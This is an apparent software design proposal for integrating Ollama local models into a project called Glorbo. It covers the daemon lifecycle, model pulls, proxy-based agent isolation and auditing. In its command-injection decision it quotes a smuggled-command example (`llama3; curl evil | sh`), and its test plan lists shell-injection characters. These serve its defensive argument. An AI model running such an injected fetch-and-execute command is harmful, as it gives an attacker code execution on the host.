---
gep: 67
title: Ollama local-model integration — scan, pull, managed daemon
author: Bartosz Ptaszynski <foobarto@gmail.com>
status: Accepted
type: Standards
created: 2026-06-14
requires: [8, 32, 55, 59]
see-also: [5, 6, 7, 23, 61]
history:
  - date: 2026-06-14
    status: Draft
    note: |
      Initial draft. Wires the already-shipped local-model backend
      (GEP-59 hwfit scan, GEP-32 ModelCatalog + detect-providers,
      GEP-8 provider registry) into a Settings UI, and adds the two
      genuinely new pieces: model PULL and managed daemon lifecycle.
      Director chose full-lifecycle scope (manage the `ollama serve`
      daemon), which deliberately takes on GEP-59 D3's deferred
      `--serve` path. Daemon coexistence = adopt-if-running; binding
      = muontrap child that dies with glorbo.
  - date: 2026-06-14
    status: Draft
    note: |
      Revised after a 4-lens adversarial review. The original network
      design was broken: `network: loopback` is `--unshare-net` (an
      isolated netns), so an agent's `127.0.0.1` is NOT the host's —
      it could never reach the host daemon on `:11434` (GEP-55 proves
      a loopback agent gets EHOSTUNREACH to host loopback). Re-decided
      D5: agents reach the daemon through the per-company GEP-55
      inference proxy on `network: proxy`, never raw `:11434` — which
      also closes the cross-company isolation hole on the
      unauthenticated endpoint. Added model-name validation + execve
      argv (command-injection safety, new D10), an Audit subsection,
      external-daemon-vanished handling, the full `ollama.toml` stanza,
      and split the daemon-manager / pull-streaming decisions.
  - date: 2026-06-14
    status: Accepted
    note: |
      Accepted; implementation starting, phased: (1) detect facade +
      builtin `ollama.toml`; (2) `Glorbo.Ollama.Daemon` lifecycle
      (adopt/start, muontrap); (3) `Glorbo.Ollama.Pull` (execve-safe
      download + progress); (4) GEP-55 proxy local-upstream extension
      (the `network: proxy` data path); (5) the `/providers` Settings UI.
---

# GEP-67: Ollama local-model integration — scan, pull, managed daemon

## Problem

Glorbo can already *use* a local Ollama model, but the path to get there
is a scavenger hunt across CLI verbs with no first-class UI:

- `glorbo fit` (GEP-59) scans the host and scores which model/quant fits,
  but stops at "recommend" — GEP-59 D3 explicitly deferred the
  download/serve/auto-enable (`--serve`) half as "its own deliberate
  increment."
- `glorbo detect-providers` (GEP-32 Phase 4) fingerprints a *running*
  Ollama on `127.0.0.1:11434` and `Providers.Enable.enable/2` writes the
  provider entry — but only if a daemon is already up and a model is
  already pulled.
- `Glorbo.Providers.ModelCatalog` (GEP-32 Phase 3) probes Ollama's
  `/api/tags` and caches the result, but nothing surfaces it for
  selection.

So the Director who wants "scan my hardware, pull a model that fits, and
use it" has to: install ollama, start the daemon, run `ollama pull` in a
terminal, then come back and run two glorbo verbs. There is no
"Local models" surface in the dashboard, no in-product model download,
and no help managing the daemon. The backend is ~70% built; the
**Settings UI, the model pull, and daemon lifecycle** are missing.

## Goals

- A **"Local models (Ollama)"** section in the dashboard that ties the
  existing pieces together: detect → scan hardware → see what fits →
  pull → configure → use.
- **Detect** whether `ollama` is installed (binary on `PATH`) and whether
  a daemon is answering on `:11434`.
- **Scan hardware** via `Glorbo.Fit` (GEP-59) and show which models fit /
  are tight / won't fit.
- **Pull** a model from the dashboard with live progress (`ollama pull`),
  with the model name validated and exec'd safely.
- **Manage the daemon**: adopt an already-running `ollama serve`; start +
  supervise one when none is running; never stop a daemon Glorbo didn't
  start.
- **Enable + use**: register the model as a provider
  (`Providers.Enable.enable/2`) so agents can select it, reaching the
  daemon through the per-company GEP-55 inference proxy.

## Non-goals

- **Bundling an inference engine.** Glorbo does not ship llama.cpp / GGUF
  weights; it orchestrates the host's `ollama` binary (GEP-59 D2).
- **Managing non-Ollama local engines** (llama.cpp, vLLM, LM Studio,
  LocalAI). Those are already detectable via `detect-providers`; this GEP
  is Ollama-specific for the pull + daemon surface.
- **Authenticating the daemon's `:11434` endpoint.** It stays an
  unauthenticated loopback service — and that is acceptable *because*
  agents never reach it directly (D5: only the host-side per-company
  proxy and host processes talk to `:11434`; a sandboxed agent has no
  path to it). The embedder (`embedder.ex`) already trusts the same local
  endpoint.
- **Remote / multi-host Ollama.** Endpoint is `127.0.0.1:11434`; a
  remote Ollama is a separate concern.
- **Replacing `glorbo fit` / `detect-providers`.** This GEP *calls* them;
  it does not change their contracts.

## Design

### Module shape (host-side, Elixir)

```
Glorbo.Ollama                  facade: install + daemon + catalog status
├── Glorbo.Ollama.Detect       `ollama` on PATH? version? daemon up on :11434?
├── Glorbo.Ollama.Daemon       GenServer: adopt-if-running / start-if-not
│                              state machine; muontrap-supervised when
│                              self-started; status :external | :managed | :down
├── Glorbo.Ollama.Pull         validates the model name, runs `ollama pull`
│                              via execve (no shell), streams progress via PubSub
└── Glorbo.Ollama.Catalog      wraps Providers.ModelCatalog (/api/tags) +
                               the curated "available to pull" list
```

Reused as-is (no new code): `Glorbo.Fit` (`recommend/1` — hwfit scan +
scoring), `Glorbo.Providers.ModelCatalog` (`/api/tags` probe with the
existing `shape: :ollama` parser + `provider_models` projection),
`Glorbo.Providers.Enable.enable/2` (writes the `[[providers]]` block),
`Glorbo.CLI.Registry` (detection snapshot), and the GEP-55
`Glorbo.OpenAIProxy` (the agent→model data path).

### Daemon state machine (`Glorbo.Ollama.Daemon`)

```
                    probe 127.0.0.1:11434
                          │
              ┌───────────┴───────────┐
        ollama answers           nothing / non-ollama
              │                         │
         :external                start `ollama serve`
       (observe only,            via muontrap, link to
        Stop/Restart             glorbo's supervision tree
        disabled);                     │
        re-probe ──┐          ┌────────┴────────┐
        on vanish  │      bind OK            bind fails
              │    │          │                  │
              ▼    │      :managed            :down
           :down ──┘   (Stop/Restart        (surface reason:
       (surface;        enabled,             port held / serve
        no auto-start   dies with glorbo)    error / no binary)
        replacement)
```

- **Adopt, don't fight (D2).** If `:11434` answers with an Ollama
  fingerprint (the GEP-32 detection shape), the daemon is `:external` —
  Glorbo uses it and shows "● running · external"; Stop/Restart are
  disabled. Glorbo only ever stops/restarts a daemon it `:managed`.
  Because the fingerprint is HTTP-shape only (not process identity), the
  UI labels an adopted daemon "externally managed — not authenticated by
  Glorbo" and audits the adoption (see Audit, and D2's Why).
- **Bound lifetime (D3).** A self-started daemon is a muontrap child of
  glorbo's supervision tree — it exits when glorbo exits (GEP-59 D2
  precedent). Weights persist in `~/.ollama/`, so a glorbo restart just
  re-spins the daemon in seconds.
- **External vanish.** An adopted `:external` daemon that stops
  mid-session (the user's systemd `--user` ollama is stopped) re-probes
  to `:down` — Glorbo does **not** auto-start a replacement (that would
  fight a service the user controls and violate the
  never-start-over-someone-else's-daemon spirit).
- **Bounded restart.** A `:managed` daemon that crashes is restarted by
  the supervisor up to a small bound, then parked at `:down` with the
  reason surfaced — never a hot restart loop.

### Model pull (`Glorbo.Ollama.Pull`) — and pull safety

`ollama pull <model>` runs host-side via muontrap (D4), **never through a
shell** (D10):

1. The model name is user/UI-controlled (pull button, recommended rows,
   any free-text field), so it is **validated against ollama's
   `name[:tag]` grammar** — `^[a-z0-9][a-z0-9._-]*(:[a-z0-9._-]+)?$` (with
   an optional `registry/namespace/` prefix of the same charset) — and
   rejected otherwise, *before* any exec.
2. It is passed as a **single discrete argv element via execve**
   (`muontrap` / `Port.open({:spawn_executable, _}, args: [...])`), so no
   shell metacharacter is ever interpreted — mirroring
   `bwrap.ex`'s "every list element is exactly one argv slot, no
   shell-escaping" contract.
3. `ollama pull -- <model>` uses end-of-options so a crafted name can
   never be parsed as an `ollama` flag.

Progress output is parsed into `{:progress, model, pct}` / `{:done,
model}` / `{:error, model, reason}` events published on a per-pull PubSub
topic the LiveView subscribes to. **One pull at a time** (D9: disk +
bandwidth contention); further requests queue. Cancel terminates the
muontrap child; ollama resumes partial layers on a later pull.

### How an agent reaches the daemon — the GEP-55 proxy path (D5)

A sandboxed agent **cannot** reach the host daemon directly.
`network: loopback` is `--unshare-net` (`bwrap.ex:272`): a fresh network
namespace whose `127.0.0.1` is the *agent's own* loopback, not the host's.
The host daemon on `127.0.0.1:11434` is therefore as unreachable from
inside that netns as the host Phoenix endpoint — GEP-55 proves a
`network: loopback` agent gets `EHOSTUNREACH` reaching host
`127.0.0.1:4000`. (There is no veth in loopback mode; veth belongs to
`:proxy`.)

So an Ollama-using agent runs on **`network: proxy`** and reaches its
model exactly the way every other proxied provider does (GEP-55):

```
agent (network: proxy)                  host BEAM
  $OPENAI_BASE_URL = http://127.0.0.1:<proxy_port>
        │  OpenAI v1 + per-dispatch token
        ▼
  per-company Glorbo.OpenAIProxy ──────► forwards host-side to the
  (TokenResolver → {co, agent,           local daemon endpoint
   dispatch_id}; OpenAI-v1 adapter)      http://127.0.0.1:11434/v1
                                         (no upstream auth — local
                                          daemon needs none)
```

The proxy is the host-side BEAM, which *can* reach host loopback, so it
bridges the netns boundary the agent cannot cross. This single change is
why agents **never receive raw `:11434`**, and it closes the isolation
hole an exposed endpoint would open:

- **Per-company scoping.** The proxy resolves `{company, agent}` from the
  per-dispatch token and serves only the model named in that agent's
  granted provider entry — an agent cannot enumerate `/api/tags` across
  companies or invoke a model it wasn't enabled for.
- **Audit + cost.** Inference flows through the existing GEP-55
  telemetry/audit path; agent dispatches against a local model are
  recorded like any other.
- **No shared raw endpoint.** The daemon is one shared host process
  (models on disk/VRAM are physically shared — a resource fact, not an
  access path), but only the trusted per-company proxy talks to it; there
  is no cross-company *access* channel at the agent layer.

This **extends GEP-55**: its shipped adapters target keyed *cloud*
upstreams (`api_key_env` + `System.get_env`); GEP-67 adds a **local,
no-auth upstream** mode — the OpenAI-v1 adapter forwards to the provider's
local `endpoint` and attaches no upstream credential. The ollama provider
opts into the proxy path (it routes via the proxy not to hide a key, but
to bridge the sandbox→host-daemon boundary with per-company scoping). See
Migration.

### On-disk placement (D6)

| State | Where | Why |
|---|---|---|
| Provider definition (builtin) | `priv/providers/ollama.toml` (in-repo) | GEP-8 builtin provider |
| Enabled provider | `~/.config/glorbo/providers.toml` `[[providers]]` | GEP-61 config home |
| Daemon mode + default model | `~/.config/glorbo/providers/ollama.toml` | GEP-61 per-provider config slot (named, not SQLite) |
| Pulled-model list | `provider_models` SQLite (from `/api/tags`) | derived + rebuildable (GEP-7) |
| Pull progress | ephemeral PubSub | runtime-only, never persisted |
| Model weights (GGUF) | `~/.ollama/` | not Glorbo state at all (GEP-3) |

Everything that must survive `rm glorbo.db && glorbo migrate && glorbo
reindex` is on disk first; nothing Ollama-related lives only in SQLite.

### Provider entry (`priv/providers/ollama.toml`)

```toml
name = "ollama"
kind = "native"                 # GEP-32 OpenAI-v1 harness
endpoint = "http://127.0.0.1:11434/v1"
auth = "none"                   # local daemon needs no key
usage_parser = "native-v1"
model_list = { path = "/api/tags", shape = "ollama" }   # ModelCatalog shape: :ollama
```

The `endpoint` is where the **proxy** forwards host-side (D5); the agent's
`BASE_URL` points at the proxy, per the standard GEP-55 wiring.

### Audit

Privileged Director actions emit append-only audit events
(`audit/YYYY-MM.jsonl`, `_system` scope where there is no agent actor),
consistent with the audit-append-only invariant:

- `ollama.pull.start` / `ollama.pull.done` / `ollama.pull.fail`
  (target = model name + resolved digest — model provenance is
  supply-chain metadata worth recording).
- `ollama.provider.enable` (target = model).
- `ollama.daemon.start` / `stop` / `restart` / `adopt-external`
  (target = mode + reason; `adopt-external` records that prompts may flow
  to a daemon Glorbo did not start/authenticate).

### Settings UI (D7)

A "Local models (Ollama)" section on the existing `/providers` LiveView
(GEP-8 D16) — not a new route. Layout:

- **Daemon panel** — status (external / managed / down), and Start /
  Stop / Restart (Stop/Restart enabled only when `:managed`); an adopted
  external daemon is labelled "not authenticated by Glorbo."
- **Scan hardware** button → `Glorbo.Fit.recommend/1` → RAM/VRAM summary +
  fit-bucketed model recommendations.
- **Model rows** — recommended-to-pull (from the curated offline catalog,
  D9) + already-installed (from `/api/tags`), each with Pull (live
  progress bar) and Enable.

Per GEP-6: every button calls an existing Elixir function (never direct
file I/O from the browser); results flow back filesystem → PubSub →
LiveView. The daemon manager is a supervised singleton, not LiveView
state (D8).

## Migration / rollout

Additive. New modules + one builtin provider TOML + a Settings section.
No on-disk format change, no change to existing provider contracts, no
migration step. The one cross-cutting change is **extending the GEP-55
proxy** to forward to a local no-auth upstream (D5) — a new OpenAI-v1
adapter path, not a breaking change to the existing keyed-upstream path.
Existing users see a new section; if `ollama` isn't installed it renders
"not detected" with an install hint. Pre-1.0, so no compatibility shim is
needed even though nothing breaks.

## Failure modes

| Condition | Surface |
|---|---|
| `ollama` not on PATH | "not detected" + install hint; no crash (hwfit-style graceful degrade) |
| `:11434` held by a non-ollama process | fingerprint fails → "no daemon"; a self-start bind then fails → "port :11434 in use" |
| Adopted external daemon stops mid-session | re-probe → `:down`; surface; **no** auto-start replacement |
| `ollama serve` fails (GPU/driver, etc.) | `:down` with the captured reason; no retry loop |
| Model name fails validation | pull rejected before exec (D10) |
| Pull fails (network / disk full / bad name) | error streamed to the row; retry allowed; ollama resumes partial layers |
| `:managed` daemon crashes | bounded supervisor restart, then `:down` + reason |
| Proxy can't reach the daemon (down) | agent dispatch returns a clear "model unavailable" error, not a hang |
| Model pulled that hwfit said "won't fit" | allowed, with a warning — hwfit advises, never blocks |

## Test strategy

- **Unit.** `Daemon` state machine: adopt when the probe returns an
  ollama fingerprint; start-if-absent; the **never-stop-external**
  invariant; **external-vanish → `:down` without auto-start**; bounded
  restart. `Pull` model-name validation against injection payloads
  (`;`, `$()`, backticks, `--flag`, `../` traversal) asserting
  reject-or-literal-argv, plus the progress parser against sample
  `ollama pull` output. `Detect` matrix (binary present/absent × daemon
  up/down). On-disk placement (config under `config_root`, provider entry
  in `providers.toml`, selection survives `rm glorbo.db && migrate &&
  reindex`).
- **Integration / boundary.** Encode the netns boundary as a test so the
  premise can't silently regress: a real `--unshare-net`
  (`network: loopback`) agent **cannot** reach a stub `:11434`, while a
  `network: proxy` agent reaches the stub daemon **through** the GEP-55
  proxy. Enable flow writes a valid `[[providers]]` block.
- **Cross-company (negative).** A company-A agent cannot see company-B's
  pulled models via the proxy and cannot invoke a model it wasn't enabled
  for.
- **Audit.** Each Director action (pull start/done/fail, enable, daemon
  start/stop/restart/adopt-external) emits the expected append-only audit
  line.
- **E2E** (1 unit + 1 E2E per ship, minimum). The Settings section
  against a **fake ollama** — a local HTTP server answering `/api/tags`
  + `/api/pull` plus a stub `ollama` binary on PATH — so CI needs no real
  ollama, GPU, or network: detect state renders, Scan hardware shows
  recommendations, a mocked pull streams progress → done, Enable flips
  the model to usable, the daemon panel shows external-vs-managed
  correctly.

## Open questions

- **Online model browse.** v1 ships the curated, compiled-in catalog
  (D9). Querying the live Ollama library registry for a browsable catalog
  is deferred.
- **Parallel pulls.** v1 is one-at-a-time with a queue (D9). Whether users
  want concurrent pulls is a genuine post-v1 question.
- **Accelerator depth.** hwfit already probes `nvidia-smi` / `rocm-smi`.
  Whether to surface accelerator-specific quant advice or just RAM/VRAM
  fit is an implementation depth call.
- **Non-PATH installs.** ollama via flatpak/snap may not be on `PATH`;
  how hard `Detect` probes known locations is deferred.
- **Daemon identity assurance.** D2 adopts on an HTTP fingerprint and
  warns; whether to add a socket-owner/exe-path identity check
  (`/proc/net/tcp` → inode → PID → exe) before routing prompts to an
  adopted daemon is a worthwhile hardening, deferred to implementation.

## Decision log

### D1. Scope = full local-model lifecycle, including the daemon

- **Decided:** GEP-67 covers detect → scan → pull → manage daemon →
  enable → use, in one Settings surface — explicitly taking on GEP-59
  D3's deferred `--serve` (download/serve/auto-enable) path.
- **Alternatives:** (a) UI-only over the shipped backend, no in-product
  download; (b) detect + scan + pull + use but assume an
  externally-run daemon, with no lifecycle management.
- **Why:** the Director chose batteries-included. The shipped backend
  already covers detection, catalog, hwfit scan, and enable, so the
  marginal new build is the pull + daemon lifecycle; delivering the whole
  flow as one coherent UX is worth taking on GEP-59's deferral now.

### D2. Daemon coexistence = adopt-if-running, never stop what we didn't start

- **Decided:** probe `:11434` first. If an Ollama daemon answers (systemd
  `--user`, manual, or a prior Glorbo), adopt + observe it (`:external`),
  label it "not authenticated by Glorbo", and audit the adoption; only
  spawn Glorbo's own `ollama serve` when none is found. Glorbo only
  stops/restarts daemons it started, and never auto-starts a replacement
  for an external daemon that vanished.
- **Alternatives:** Glorbo always owns the daemon (refuse/warn on an
  external one); a Director-configurable "managed vs external" toggle.
- **Why:** ollama ships as a systemd `--user` service by default on
  Linux; double-starting fights for `:11434`. Adopt-if-running respects
  the host, avoids port conflicts, and never kills a process the user
  owns. The trade is identity assurance: the GEP-32 fingerprint is
  HTTP-shape only, so a local process could squat `:11434` and answer
  `/api/tags` to be adopted, receiving any prompt Glorbo routes there
  (since agents go through the proxy to a host endpoint, the squat target
  is the daemon, not an agent). We accept this for host-friendliness but
  name it: label + audit the unauthenticated adoption, and leave a
  socket-owner identity check as deferred hardening (Open questions).

### D3. A self-started daemon is bound to glorbo's lifecycle (muontrap)

- **Decided:** a Glorbo-started daemon is a muontrap-supervised OTP child
  that exits when glorbo exits.
- **Alternatives:** a persistent/detached daemon that survives glorbo
  restarts, with reconnect-on-boot health logic.
- **Why:** matches the codebase invariant that subprocesses die with the
  BEAM (GEP-5 ethos, GEP-59 D2 muontrap precedent) — clean teardown, no
  orphan daemons. Weights persist on disk, so the cost of a glorbo
  restart is a few seconds of daemon spin-up, not a re-download — the
  persistence upside is small and the orphan/cleanup/reconnect cost is
  real.

### D4. Pull + serve run host-side, never inside an agent sandbox

- **Decided:** `ollama pull` and `ollama serve` are host-side Glorbo
  subprocesses (muontrap), orchestrated by OTP processes; agents never
  invoke them.
- **Alternatives:** an agent shells out to `ollama` inside its bwrap
  sandbox (the host binary IS visible via the read-only `/usr`
  bind-mount).
- **Why:** GEP-59 D2 precedent — serving is a trusted host subprocess,
  not agent-side inference. Model management is a Director operation;
  keeping it off the untrusted agent surface means an agent can only ever
  reach the daemon through the per-company proxy (D5), never drive
  downloads or the lifecycle. Residual trust, stated explicitly: pull
  egress is host-side and therefore **not** subject to the GEP-23 proxy
  allowlist, and `serve` runs unsandboxed with host GPU/driver access —
  both acceptable because model management is Director-trusted, and the
  curated offline catalog (D9) bounds which registry paths a pull can
  reach by default.

### D5. Agents reach the daemon through the per-company GEP-55 proxy

- **Decided:** an agent using an Ollama model runs `network: proxy` and
  reaches the model via the per-company `Glorbo.OpenAIProxy`, which
  forwards host-side to the local `endpoint` (`127.0.0.1:11434/v1`) with
  no upstream auth. Agents never receive raw `:11434`.
- **Alternatives:** (a) `network: loopback` to `127.0.0.1:11434` directly
  — **does not work**: `--unshare-net` gives the agent its own isolated
  loopback, so the host daemon is unreachable (GEP-55: loopback ⇒
  EHOSTUNREACH to host loopback). (b) a direct `pasta -T 11434` forward
  into the agent netns (the `:proxy` mechanism) — works, but hands the
  agent a raw, unauthenticated, shared endpoint: cross-company `/api/tags`
  enumeration, inference against any model regardless of grant, and
  cross-company GPU contention — an erosion of the "company isolation is
  absolute" invariant.
- **Why:** the proxy is the only existing host-side component that can
  reach host loopback on the agent's behalf, AND it enforces per-company
  scoping, per-model grant, audit, and cost — turning a would-be raw
  shared endpoint into an isolated, authorized, audited path. Reusing it
  keeps agents on their normal proxy path and keeps the enforcement at the
  proxy (host) layer rather than trusting application-layer TOML scoping
  against a wide-open socket.

### D6. On-disk placement follows filesystem-as-truth + XDG config

- **Decided:** builtin provider def → `priv/providers/ollama.toml`;
  enabled provider → `~/.config/glorbo/providers.toml`; daemon mode +
  default model → `~/.config/glorbo/providers/ollama.toml` (named);
  pulled-model list → the rebuildable `provider_models` SQLite projection
  from `/api/tags`; pull progress → ephemeral PubSub; weights →
  `~/.ollama/` (not Glorbo state).
- **Alternatives:** store the daemon-mode/selection in SQLite only; put
  config in the `~/.glorbo/` data tree.
- **Why:** SQLite-only selection violates GEP-3/7 rebuildability; config
  in `~/.glorbo/` violates GEP-61's "data-only after." Naming the config
  file (rather than "a config file") stops an implementer drifting the
  setting into SQLite-only or `~/.glorbo`. Each piece lands where its kind
  belongs, keeping `reindex` correct and `~/.glorbo` backups config-free.

### D7. Settings surface extends the existing `/providers` LiveView

- **Decided:** add a "Local models (Ollama)" section to `/providers`;
  buttons call existing Elixir functions, never direct browser file I/O.
- **Alternatives:** a new `/settings/models` top-level route.
- **Why:** GEP-8 D16 already made `/providers` the provider interaction
  surface; Ollama is a provider, so one surface avoids a parallel
  navigation path. Mutations-through-Elixir + file → PubSub → LiveView
  per GEP-6.

### D8. The daemon manager is a supervised singleton, not LiveView state

- **Decided:** `Glorbo.Ollama.Daemon` owns the adopt/start/monitor state
  machine as a single supervised GenServer in the application tree.
- **Alternatives:** manage the daemon inline in the `/providers` LiveView
  process; a bare unsupervised `Task`.
- **Why:** a LiveView process is per-connection and dies on disconnect,
  but daemon ownership (and a muontrap child's lifetime) must outlive any
  one browser socket and be the same across every Director session — that
  requires a singleton, supervised process, not connection-scoped state.

### D9. One pull at a time, from a curated offline catalog

- **Decided:** pulls run one-at-a-time with a queue; the "available to
  pull" list is the curated, compiled-in catalog (reusing hwfit's
  approach), not a live registry query, for v1.
- **Alternatives:** concurrent pulls; a live Ollama-library-registry
  browse.
- **Why:** concurrent multi-GB pulls contend for disk + bandwidth and
  muddy progress UX; a queue is simpler and honest. Offline-first
  (GEP-59 D4): a curated catalog needs no network for the core
  recommend/pick path and bounds which registry paths a pull reaches.
  Live browse is deferred (Open questions).

### D10. Model name is validated and exec'd via execve, never a shell

- **Decided:** the user/UI-controlled model name is validated against
  ollama's `name[:tag]` grammar and rejected otherwise *before* exec, then
  passed as a single discrete argv element via execve
  (`muontrap`/`Port` `args:`), with `--` end-of-options.
- **Alternatives:** interpolate the name into a shell string
  (`sh -c "ollama pull #{name}"`); exec without a charset check.
- **Why:** pull runs **host-side, outside the sandbox** (D4), so an
  unvalidated name in a shell string is host RCE in a trusted context
  (`llama3; curl evil | sh`, `$(...)`, backticks). execve with a validated
  discrete argv removes shell interpretation entirely, and `--` stops a
  crafted name being read as an `ollama` flag — matching the project's
  `System.cmd`/argv hygiene gate (Sobelow) and Paranoid posture.

## Related

- GEP-59 — hwfit (the scan this builds the UI on; this GEP takes on its
  deferred `--serve` increment).
- GEP-32 — Native Agent Harness (ModelCatalog `/api/tags`,
  `detect-providers`, the OpenAI-v1 harness the `ollama` provider uses).
- GEP-55 — In-process inference proxy (the per-company agent→model data
  path; extended here for a local no-auth upstream).
- GEP-8 — Provider Registry (the registry the `ollama` entry slots into;
  `/providers` LiveView).
- GEP-23 / GEP-31 — Egress proxy + netns isolation (`network: proxy` is
  the mode an ollama agent runs in; why `loopback` can't reach the host
  daemon).
- GEP-5 — Sandboxing (host-vs-sandbox boundary for pull/serve; no Python).
- GEP-61 — XDG config home (where provider config + the daemon setting
  live).
- GEP-3 / GEP-7 — filesystem-as-truth + SQLite-derived (on-disk
  placement).
